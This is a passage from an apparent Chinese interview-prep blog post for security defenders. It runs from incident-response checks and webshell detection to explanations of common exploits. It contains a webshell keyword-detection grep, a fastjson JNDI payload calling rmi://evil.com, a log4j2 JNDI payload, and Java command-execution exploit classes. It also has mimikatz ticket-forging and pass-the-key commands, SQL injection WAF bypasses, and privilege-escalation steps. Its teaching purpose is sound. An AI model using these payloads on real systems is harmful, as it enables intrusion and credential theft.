class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure><p>7.检查服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list 命令，可以查看系统运行的服务</span><br></pre></td></tr></table></figure><p>8.检查异常文件</p><p>9.检查系统日志，web日志</p><p>10.检查后门，ssh后门</p><p>11.其他</p><p>linux登录日志，默认存放在&#x2F;var&#x2F;log&#x2F;</p><p>检查一些用户密码，空口令，ssh登录密码，sudo配置等等</p><p>中间件权限和数据库权限降低</p><h2 id="5-owasp-top10"><a href="#5-owasp-top10" class="headerlink" title="5.owasp top10"></a>5.owasp top10</h2><p>(1)SQL 注入</p><p>(2)失效的身份认证和会话管理</p><p>(3)跨站脚本攻击 XSS</p><p>(4)直接引用不安全的对象</p><p>(5)安全配置错误</p><p>(6)敏感信息泄露</p><p>(7)缺少功能级的访问控制</p><p>(8)跨站请求伪造 CSRF</p><p>(9)使用含有已知漏洞的组件</p><p>(10）未验证的重定向和转发</p><h2 id="6-如何查杀勒索病毒，日志文件被加密了怎么办"><a href="#6-如何查杀勒索病毒，日志文件被加密了怎么办" class="headerlink" title="6.如何查杀勒索病毒，日志文件被加密了怎么办"></a>6.如何查杀勒索病毒，日志文件被加密了怎么办</h2><p>具体细节我也不知道，勒索病毒把文件加密了，就意味着ps，top等进程查看命令用不了了，怎么查找后门呢。还是说有内核级的查杀方法吗，大佬告知！</p><h2 id="7-如何判断受陷主机"><a href="#7-如何判断受陷主机" class="headerlink" title="7.如何判断受陷主机"></a>7.如何判断受陷主机</h2><p>1.首先一台主机被入侵，一定存在一个交互，可以看一下端口和进程，及时隔离。</p><p>2.如果已经进入内网了，可以先用wireshark抓一段数据包方便溯源，尽快断网隔离主机或者同网段。</p><h2 id="8-如何查杀webshell"><a href="#8-如何查杀webshell" class="headerlink" title="8.如何查杀webshell"></a>8.如何查杀webshell</h2><h3 id="1-静态检测"><a href="#1-静态检测" class="headerlink" title="1.静态检测"></a>1.静态检测</h3><p>可以通过关键词匹配，例如一些base64encode，eval等等词</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name <span class="string">&quot;*.php&quot;</span> |xargs egrep <span class="string">&#x27;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2-行为检测"><a href="#2-行为检测" class="headerlink" title="2.行为检测"></a>2.行为检测</h3><p>可能存在一些命令执行，系统调用，服务创建等操作，</p><h3 id="3-流量检测"><a href="#3-流量检测" class="headerlink" title="3.流量检测"></a>3.流量检测</h3><p>通过一些webshell客户端的强特征，一些加密后的特征，还有一些敏感词查杀</p><h3 id="4-日志检测"><a href="#4-日志检测" class="headerlink" title="4.日志检测"></a>4.日志检测</h3><p>webshell一般会在web日志留下痕迹，还有数据提交记录</p><h2 id="9-用过哪些厂商的设备"><a href="#9-用过哪些厂商的设备" class="headerlink" title="9.用过哪些厂商的设备"></a>9.用过哪些厂商的设备</h2><h2 id="10-参加过基础hw和重保，都是什么职位"><a href="#10-参加过基础hw和重保，都是什么职位" class="headerlink" title="10.参加过基础hw和重保，都是什么职位"></a>10.参加过基础hw和重保，都是什么职位</h2><h1 id="细节题"><a href="#细节题" class="headerlink" title="细节题"></a>细节题</h1><h2 id="1-说说shiro的漏洞原理和利用方式"><a href="#1-说说shiro的漏洞原理和利用方式" class="headerlink" title="1.说说shiro的漏洞原理和利用方式"></a>1.说说shiro的漏洞原理和利用方式</h2><p>shiro提供了一个rememberme的功能，在浏览器关闭的时候再次打开就会自动记住会话而不需要重新登录，在反序列过程中，由于使用aes对称加密,并且密钥硬编码在代码里，导致可以构造恶意的序列化加密内容，反序列化时造成rce漏洞，高版本（1.2.4以上）移除默认密钥可以自定义密钥，但是一些开源的shiro框架还是可以获取密钥，进而rce。</p><p>服务器解析cookie过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、检索RememberMe cookie 的值</span><br><span class="line">2、Base 64解码</span><br><span class="line">3、使用AES解密(加密密钥硬编码)</span><br><span class="line">4、进行反序列化操作（未作过滤处理），在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞</span><br></pre></td></tr></table></figure><p>shiro漏洞指纹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">返回包中存在set-Cookie: rememberMe=deleteMe</span><br><span class="line">或者URL中有shiro字样</span><br><span class="line">有时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可</span><br></pre></td></tr></table></figure><h2 id="2-shiro不出网利用方式"><a href="#2-shiro不出网利用方式" class="headerlink" title="2.shiro不出网利用方式"></a>2.shiro不出网利用方式</h2><p>利用python3的shiro利用脚本-<a href="https://github.com/zhzyker/shiro-1.2.4-rce">传送门</a><br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459940137.png" alt="在这里插入图片描述"><br>shiro &lt;&#x3D; 1.2.4 反序列化远程命令执行利用脚本<br>使用延时判断key和gadget，即使目标不出网也可以检测是否存在漏洞<br>python脚本需要调用ysoserial-sleep.jar，ysoserial-sleep.jar文件并不是原版的，增加了延时命令功能，故不要使用原版ysoserial，否则将无法检测</p><p><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459939917.png" alt="在这里插入图片描述"><br>粗略看一下代码，使用了sleep（5）判断key和gadget，并且linux和windows都试用。</p><h2 id="3-fastjson的原理和简单利用"><a href="#3-fastjson的原理和简单利用" class="headerlink" title="3.fastjson的原理和简单利用"></a>3.fastjson的原理和简单利用</h2><h3 id="3-1原理"><a href="#3-1原理" class="headerlink" title="3.1原理"></a>3.1原理</h3><p>fastjson的原理就是再反序列化的时候，可以利用搭建一个恶意的rmi服务器上放一个恶意的类，然后通过json的JNDI References的rmi远程下载这个类，fastjson就会反序列化，然后执行rce。</p><h3 id="3-2JNDI-References注入"><a href="#3-2JNDI-References注入" class="headerlink" title="3.2JNDI References注入"></a>3.2JNDI References注入</h3><p>jndi提供了很多服务，dns rmi idap等，可以利用github的<a href="https://github.com/mbechler/marshalsec">marshalsec项目</a>在vps搭建rmi服务器，并且挂恶意的类，进行rce。</p><h3 id="3-3fastjson指纹"><a href="#3-3fastjson指纹" class="headerlink" title="3.3fastjson指纹"></a>3.3fastjson指纹</h3><p>1.如果报错有回显可以构造缺少的json，通过回包是否有fastjson等字段进行判断，例如少一个括号。<br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459939918.png" alt="在这里插入图片描述"></p><p>2.如果没有回显可以利用dnslog</p><p>直接发包，poc如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;zeo&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog的地址&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_17,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_17,color_FFFFFF,t_70,g_se,x_16-168242459939919.png" alt="在这里插入图片描述"><br>指纹识别简化操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://your-ip:8090/ -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-4fastjson利用方式"><a href="#3-4fastjson利用方式" class="headerlink" title="3.4fastjson利用方式"></a>3.4fastjson利用方式</h3><p>根据fastjson版本的不同和jave环境版本的不同，有rmi方式和idap方式，利用的攻击链也是不一样的。</p><p>Exploit.class类如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // <span class="keyword">do</span> nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搭建rmi服务器，放这个类</p><p>构造poc如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-log4j2原理和利用"><a href="#4-log4j2原理和利用" class="headerlink" title="4.log4j2原理和利用"></a>4.log4j2原理和利用</h2><h3 id="4-1原理"><a href="#4-1原理" class="headerlink" title="4.1原理"></a>4.1原理</h3><p>Apache Log4j2是一个基于Java的日志记录工具，该工具重写了Log4j框架，并且引入了大量丰富的特性，Apache log4j2是Log4j的升级版，这个日志框架被大量用于业务系统开发，用来记录日志信息。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中，以便开发人员记录原因。</p><p>payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://xxx.xxx.xxx.xxx:1389/Exp&#125;</span></span><br></pre></td></tr></table></figure><p>当我们在任何输入框里面输入这个payload，那么log4j2就会将我们的输入的信息记录到日志中，在记录日志的时候会间接的调用log4j2 的 MessagePatternConverter 组件中的 format 方法。</p><p>该方法会截取美元符和花括号之间的字符串，将该字符作为查找对象的条件。如果字符是 jndi:ldap 这样的协议格式则进行jndi方式的 ldap  调用。</p><p>通过JNDI这个接口传入一个可控参数，因为JNDI动态协议转换，所以我们传入ldap协议，就会自动换成这个协议，然后调用lookup去LDAP服务器端去获取一个不存在的资源。</p><p>因为这个资源不存在，且支持JNDI Naming Reference，那么LDAP就会去他指定的一个url去动态加载。如果加载的这个资源里面包含无参构造函数或者静态方法那么代码就会被执行。</p><p>恶意class类如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行漏洞代码1&quot;</span>);</span><br><span class="line">            String cmd = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"> </span><br><span class="line">            Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">            System.out.println(<span class="string">&quot;执行漏洞代码2&quot;</span>);</span><br><span class="line">        &#125; catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#恶意的Exploit代码，功能打开电脑的计算器。</span></span><br></pre></td></tr></table></figure><p>还是利用marshalsec项目，搭建一个ldap的服务端</p><p>直接构造poc<br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459940020.png" alt="在这里插入图片描述"><br>这里需要注意，如果不回显，<strong>需要进行url编码</strong>。</p><p>具体getshell的工具GitHub上有，师傅们自行百度吧。</p><h2 id="5-spring-core-rce原理和简单利用"><a href="#5-spring-core-rce原理和简单利用" class="headerlink" title="5.spring core rce原理和简单利用"></a>5.spring core rce原理和简单利用</h2><h3 id="5-1原理"><a href="#5-1原理" class="headerlink" title="5.1原理"></a>5.1原理</h3><p>由于 SerializationUtils#deserialize 基于 Java 的序列化机制，可导致远程代码执行 (RCE)，使用JDK9及以上版本皆有可能受到影响。</p><p><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459940021.png" alt="在这里插入图片描述"></p><p>这里简单说一下poc，具体原理不懂，poc上传了一个shell.jsp文件</p><p>进入网页执行命令，确实弹出calc。<br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_9,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p><h2 id="6-struts2，jboss，weblogic等漏洞"><a href="#6-struts2，jboss，weblogic等漏洞" class="headerlink" title="6.struts2，jboss，weblogic等漏洞"></a>6.struts2，jboss，weblogic等漏洞</h2><p>基本上都是一些反序列化，weblogic有个ssrf可以配合内网redis使用，还有就是weblogic弱口令。</p><h2 id="7-Kerberos协议"><a href="#7-Kerberos协议" class="headerlink" title="7.Kerberos协议"></a>7.Kerberos协议</h2><p><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_13,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>1.client加密信息发给<strong>AS认证服务器</strong></p><p>2.<strong>AS认证服务器</strong>处理请求，经过一系列的加密，将TGT（Ticket Granting Ticket，也就是票据的票据）和密钥（key1)发给客户端</p><p>3.客户端加密信息，将密钥（key2）和TGT发给TGS</p><p>4.TGS收到请求，经过一系列加密，将ST（Service Ticket，也就是我们说的票据）发送给客户端</p><p>5.客户端带着ST和密文访问server服务端</p><p>6.服务端解密ST和密文，进行鉴别授权</p><p><strong>大概分为三个阶段</strong></p><p>1.AS-REQ—AS-REP阶段</p><p>2.TGS-REQ—TGS-REP阶段</p><p>3.AP-REQ—AP-REP阶段</p><h2 id="8-简单说一下黄金白银票据和原理"><a href="#8-简单说一下黄金白银票据和原理" class="headerlink" title="8.简单说一下黄金白银票据和原理"></a>8.简单说一下黄金白银票据和原理</h2><h3 id="8-1黄金票据"><a href="#8-1黄金票据" class="headerlink" title="8.1黄金票据"></a>8.1黄金票据</h3><p>在Kerberos认证过程中，我们抓取了krbtgt用户的hash生成TGT，原理就是伪造TGT</p><p>利用条件</p><p>1.需要伪造的域管理员用户名<br>2.完整的域名<br>3.域SID<br>4.krbtgt的NTLM Hash</p><p>通过mimikatz抓取和注入票据.</p><h3 id="8-2白银票据"><a href="#8-2白银票据" class="headerlink" title="8.2白银票据"></a>8.2白银票据</h3><p>原理是伪造TGS，可以通过授权密码生成TGT(票据的票据)，而且生成ST（也就是票据）不需要经过KDC，这样就不需要域控了，不过只能访问一些特定的服务。</p><p>利用条件</p><p>1.域名<br>2.域SID<br>3.目标服务器的FQDN（域控完整名字）<br>4.可利用的服务<br>5.服务账号的NTLM Hash<br>6.要伪造的用户名</p><p><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_16,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:DEMO.com /sid:S-1-5-21-979886063-1111900045-1414766810 </span><br><span class="line">/target:WIN-ENS2VR5TR3N.DEMO.com </span><br><span class="line">/rc4:f0954d00b21d338aa86051eca90f7f74 </span><br><span class="line">/service:cifs </span><br><span class="line">/user:douser /ptt</span><br></pre></td></tr></table></figure><p>&#x2F;sid：域的SID值<br>&#x2F;rc4：server机器的hash<br>&#x2F;service：可利用的服务，这里是cifs<br>&#x2F;user：要伪造的用户名，任意填写<br>&#x2F;target：域控制器名，即FQDN（全称）</p><h2 id="9-简单说一下ms14-068漏洞原理"><a href="#9-简单说一下ms14-068漏洞原理" class="headerlink" title="9.简单说一下ms14-068漏洞原理"></a>9.简单说一下ms14-068漏洞原理</h2><h3 id="9-1原理"><a href="#9-1原理" class="headerlink" title="9.1原理"></a>9.1原理</h3><p>微软在Kerberos协议中，为了判断client的访问权限，在Kerberos协议加入了一个pac机制，也就是这个pac导致了ms14-068漏洞，发生在Kerberos认证的第一阶段-AS-REQ—AS-REP阶段。</p><p>普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。</p><p>利用ms14-068.exe进行制作票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u @ -p -s -d</span><br></pre></td></tr></table></figure><p>mimikatz将票据注入内存，net use 访问域控。</p><h2 id="10-说一下cve2020-1472漏洞原理"><a href="#10-说一下cve2020-1472漏洞原理" class="headerlink" title="10.说一下cve2020-1472漏洞原理"></a>10.说一下cve2020-1472漏洞原理</h2><p>攻击者通过 NetLogon，建⽴与域控间易受攻击的安全通道时，可利⽤此漏洞获取域管访问权限（将域控中保存在AD中的管理员password设置为空）</p><p>其漏洞原理是发⽣在 RPC 认证过程的过程中，由于错误的使⽤了 AES-CFB8 加密所导致漏洞成因，该漏洞适⽤于 Win2008 后的所有版本</p><p>注：在实战环境中，由于会把域控机器的账户和密码清空，所以有可能会导致域内出问题，可能导致某些服务⽆法正常运⾏，严重会造成脱域等情况，请谨慎利⽤，并且快速恢复域控原本hash。</p><h2 id="11-了解永恒之蓝吗，内网永恒之蓝怎么打，蓝屏怎么办"><a href="#11-了解永恒之蓝吗，内网永恒之蓝怎么打，蓝屏怎么办" class="headerlink" title="11.了解永恒之蓝吗，内网永恒之蓝怎么打，蓝屏怎么办"></a>11.了解永恒之蓝吗，内网永恒之蓝怎么打，蓝屏怎么办</h2><p>1.ms17-010是利用smb协议漏洞，获取system权限。</p><p>2.在内网中，需要正向链接，如果经常蓝屏可以用msf的bule_commnd模块，仅执行命令不拿shell，也有可能是防火墙原因。</p><h2 id="12-psexec和wmic的区别"><a href="#12-psexec和wmic的区别" class="headerlink" title="12.psexec和wmic的区别"></a>12.psexec和wmic的区别</h2><p>psexec会在目标创建一个服务，存在日志，痕迹比较多，而wmic是没有日志的。</p><h2 id="13-PTT-PTH-PTK的区别"><a href="#13-PTT-PTH-PTK的区别" class="headerlink" title="13.PTT PTH PTK的区别"></a>13.PTT PTH PTK的区别</h2><p><strong>ptt，pass the ticket</strong></p><p>通过Kerberos协议，常见攻击有MS14-068，Golden ticket，SILVER ticket，一般用于权限维持，ms14-068可以用于进击域控。</p><p><strong>pth，pass the hash</strong></p><p>域内横向移动，hash传递，因为在域内一般主机密码一样，利用smb协议的net use（ipc$共享）或者psexec，wmic登录，获取shell。</p><p><strong>ptk pass the key</strong></p><p>获取aes256加密的key，利用条件【需要打KB2871997补丁】<br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459940022.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz 命令</span></span><br><span class="line">privilege::debug           // 提升权限</span><br><span class="line">sekurlsa::ekeys            // 获取aes</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:administrator /domain:tencent /aes256:f305f03562f81f7847f17bcf9477cce414fb47e4271763cf9078cc2566316e0f</span><br></pre></td></tr></table></figure><h2 id="14-怎么绕cdn"><a href="#14-怎么绕cdn" class="headerlink" title="14.怎么绕cdn"></a>14.怎么绕cdn</h2><h3 id="1-首先判断是不是cdn-；多地ping，nslookup查询"><a href="#1-首先判断是不是cdn-；多地ping，nslookup查询" class="headerlink" title="1.首先判断是不是cdn ；多地ping，nslookup查询"></a>1.首先判断是不是cdn ；多地ping，nslookup查询</h3><h3 id="2-绕过cdn找真实ip"><a href="#2-绕过cdn找真实ip" class="headerlink" title="2.绕过cdn找真实ip"></a>2.绕过cdn找真实ip</h3><p>2.1历史dns解析记录，可以查询之前dns解析记录</p><p>2.2.海外ping，有些网站只做了国内的cdn</p><p>2.3.利用服务器给你发包，比如邮件系统，让服务器发邮件看回包ip，ssr订阅等等</p><p>2.4.子站旁站ip查询，可能找到真实ip</p><p>2.5.去掉开头的www查询</p><p>2.6.获取https的ssl证书指纹，fofa查询相关信息，获取真实ip</p><h3 id="3-验证是否真实ip"><a href="#3-验证是否真实ip" class="headerlink" title="3.验证是否真实ip"></a>3.验证是否真实ip</h3><p>1.删除本机的dns解析，直接域名绑定ip，访问域名，成功则是真实ip</p><p>2.nmap扫描，一些在线网站，工具的查询等等</p><h2 id="15-udf提权原理，写入shell的时候乱码怎么办"><a href="#15-udf提权原理，写入shell的时候乱码怎么办" class="headerlink" title="15.udf提权原理，写入shell的时候乱码怎么办"></a>15.udf提权原理，写入shell的时候乱码怎么办</h2><p>udf（User Defined Function）即用户自定义函数，通过添加新函数，进行功能扩充，通过root权限导出udf.dll到系统目录，然后通过udf.ll调用执行cmd。</p><p>利用条件<br><img src="/2022/04/22/%E8%93%9D%E9%98%9FHW-%E9%9D%A2%E8%AF%95%E5%B0%8F%E7%BB%93/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAamF2ZWxpbjI2NuahkeahkQ==,size_20,color_FFFFFF,t_70,g_se,x_16-168242459940023.png" alt="请添加图片描述"><br>原理就是通过上传udf.dll到指定目录，然后自定义函数调用udf.dll执行cmd命令，返回一个高权限的shell。</p><p>执行命令可以创建一个用户，把他加入administrator组。</p><h2 id="16-sqlmap用过吗，简单说一下–os-shell原理"><a href="#16-sqlmap用过吗，简单说一下–os-shell原理" class="headerlink" title="16.sqlmap用过吗，简单说一下–os-shell原理"></a>16.sqlmap用过吗，简单说一下–os-shell原理</h2><p>首先需要条件，</p><p>1.具有root权限（因为要写文件）<br>2.知道网站绝对路径<br>3.没开启转义</p><p>原理就是通过mysql的写入文件函数，写一个小马，用于文件上传，再通过这个小马上传一个文件执行并且回显服务端的大马，结束后删除文件清理痕迹。</p><h2 id="17-sqlmap注入https网站用什么参数"><a href="#17-sqlmap注入https网站用什么参数" class="headerlink" title="17.sqlmap注入https网站用什么参数"></a>17.sqlmap注入https网站用什么参数</h2><p>1.–force-ssl 主要是证书问题</p><p>2.或者通过代理本地的burp，<br>–proxy <a href="http://192.168.31.84:8081/">http://192.168.31.84:8081</a></p><h2 id="18-SQL注入绕过安全狗，一些绕过思路"><a href="#18-SQL注入绕过安全狗，一些绕过思路" class="headerlink" title="18.SQL注入绕过安全狗，一些绕过思路"></a>18.SQL注入绕过安全狗，一些绕过思路</h2><p>1.空格绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（） +  /**/  /*！65001*/ %20 %09 %0a %0b %0c %0d</span><br></pre></td></tr></table></figure><p>2.等号绕过</p><p>可以用like替代</p><p>3.逗号过滤</p><p>form join 等等很多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(),1,1)</span><br><span class="line">相当于</span><br><span class="line">select substr(database() from 1 <span class="keyword">for</span> 1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.关键字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=||</span><br><span class="line">xor=|</span><br><span class="line">not=!</span><br></pre></td></tr></table></figure><p>5.比较&lt; &gt;等绕过</p><p>greatest、between and等等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）greatest(n1,n2,n3,...)//返回其中的最大值</span><br><span class="line">（2）strcmp(str1,str2)//当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1</span><br><span class="line">（3）<span class="keyword">in</span> 操作符</span><br><span class="line">（4）between   and//选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。</span><br></pre></td></tr></table></figure><p>hpp参数污染，垃圾字符填充，缓冲区溢出绕过，分块传输</p><h2 id="19-mssql提权，删除xp-cmdshell怎么提权"><a href="#19-mssql提权，删除xp-cmdshell怎么提权" class="headerlink" title="19.mssql提权，删除xp_cmdshell怎么提权"></a>19.mssql提权，删除xp_cmdshell怎么提权</h2><h3 id="1-首先获取mssql的sa用户权限，通过xp-cmdshell写入创建用户，并且加入管理员组。"><a href="#1-首先获取mssql的sa用户权限，通过xp-cmdshell写入创建用户，并且加入管理员组。" class="headerlink" title="1.首先获取mssql的sa用户权限，通过xp_cmdshell写入创建用户，并且加入管理员组。"></a>1.首先获取mssql的sa用户权限，通过xp_cmdshell写入创建用户，并且加入管理员组。</h3><h3 id="2-如果xp-cmdshell被删除，可以用SP-OACreate函数"><a href="#2-如果xp-cmdshell被删除，可以用SP-OACreate函数" class="headerlink" title="2.如果xp_cmdshell被删除，可以用SP_OACreate函数"></a>2.如果xp_cmdshell被删除，可以用SP_OACreate函数</h3><p>2.1打开SP_OACreate选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 